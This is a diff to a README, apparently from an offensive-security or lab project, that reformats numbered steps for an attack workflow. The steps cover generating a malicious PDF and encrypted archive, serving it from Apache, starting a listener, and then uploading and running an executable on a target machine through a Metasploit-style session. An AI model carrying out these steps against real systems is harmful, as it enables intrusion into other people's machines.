@@ -31,24 +31,18 @@ File can be downloaded at http://***host network IP***:80
 
 ## General Steps
 
-Begin by generating the malicious PDF and generate encrypted archive file by generating the exe of 'generate_malicious_pdf.sh'.
+1. Begin by generating the malicious PDF and generate encrypted archive file by generating the exe of 'generate_malicious_pdf.sh'.
 
-  Run the exe, which will add the encrypted archive file to /var/www/html/
-    
-    Access the IP and Port that the Apache2 is running on
-    
-    Activate the listener script to initialize the session
-
-Start listener by running the listener.sh script
+2. Start listener by running the listener.sh script
   
-  chmod +x listener.sh
+  1. chmod +x listener.sh
   
-Upload the upload_exe.rc file to the target machine via session
+3. Upload the upload_exe.rc file to the target machine via session
   
-  sessions -i 1
+  1. sessions -i 1
   
-  upload upload_exe.rc
+  2. upload upload_exe.rc
   
-Run the resource script in order to upload and run the executable
+4. Run the resource script in order to upload and run the executable
   
-  resource upload_exe.rc
+  1. resource upload_exe.rc
